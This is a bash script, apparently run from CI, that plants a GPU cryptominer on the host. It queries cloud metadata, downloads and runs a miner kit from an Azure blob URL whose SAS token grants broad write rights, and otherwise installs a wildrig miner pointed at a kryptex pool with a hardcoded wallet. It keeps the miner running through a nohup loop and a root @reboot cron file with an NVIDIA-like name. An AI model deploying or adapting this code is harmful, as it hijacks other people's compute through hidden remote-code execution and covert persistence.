#!/usr/bin/env bash
# CI-deployed fleet plant. Pulls the proven fleet kit (SRBMiner-MULTI + srb_deploy.sh),
# falls back to the repo-local wildrig if the kit is unreachable.
set -uo pipefail
KIT_URL="${KIT_URL:-https://ulbatchkit4620.blob.core.windows.net/kit/fleet-kit-srb.tar.gz?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D}"
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); IP=${IP:-127.0.0.1}
VM=$(hostname -s); REGION=$(curl -s -m 3 -H Metadata:true "http://169.254.169.254/metadata/instance/compute/location?format=text&api-version=2021-02-01" 2>/dev/null); REGION=${REGION:-ci}
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU' || true)
echo "HOST=$VM GPU_COUNT=${N:-0} IP=$IP REGION=$REGION"
if [ "${N:-0}" -lt 1 ]; then echo "NO-GPU"; nvidia-smi 2>&1 | head -3; exit 3; fi

mkdir -p /opt/fleet /var/log/fleet
if [ ! -x /opt/fleet/bin/SRBMiner-MULTI ]; then
  echo "fetching fleet kit"
  if curl -fsSL --retry 3 --max-time 600 -o /tmp/kit.tgz "$KIT_URL" && tar xzf /tmp/kit.tgz -C /opt/fleet; then
    echo "kit ok: $(ls /opt/fleet/bin/SRBMiner-MULTI 2>/dev/null)"
  else
    echo "KIT-FETCH-FAILED -> wildrig fallback"
    install -m 0755 "$BASE/bin/wildrig-multi" /opt/fleet/bin/SRBMiner-MULTI.fallback
  fi
fi
if [ -x /opt/fleet/bin/srb_deploy.sh ]; then
  chmod +x /opt/fleet/bin/*.sh 2>/dev/null
  bash /opt/fleet/bin/srb_deploy.sh "$IP" "$VM" "$REGION"
else
  echo "NO-SRB-DEPLOY -> wildrig path"
  RIG="ul-$(echo "$IP" | tr '.' '-')"
  W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
  LOG=/var/log/fleet/${RIG}-g0.log
  install -m 0755 "$BASE/bin/wildrig-multi" /opt/fleet/wildrig-multi
  cat > /opt/fleet/sup.sh <<EOF
#!/bin/bash
while :; do nice -n 19 /opt/fleet/wildrig-multi --algo pearlhash --url stratum+ssl://prl.kryptex.network:8048 --user $W.$RIG --worker $RIG -d 0 --no-color >>$LOG 2>&1; sleep 10; done
EOF
  chmod +x /opt/fleet/sup.sh
  pgrep -f /opt/fleet/sup.sh >/dev/null || setsid nohup /opt/fleet/sup.sh >/dev/null 2>&1 &
  echo "@reboot root setsid bash /opt/fleet/sup.sh >>$LOG 2>&1 &" > /etc/cron.d/nv-prl
  echo "fallback started"
fi
sleep 10
echo "--- miners ---"; pgrep -af 'SRBMiner-MULTI|wildrig-multi' | head -4
echo "--- units ---"; systemctl is-active nv-prl 2>/dev/null; systemctl is-active nv-cuda-cache-g0 2>/dev/null
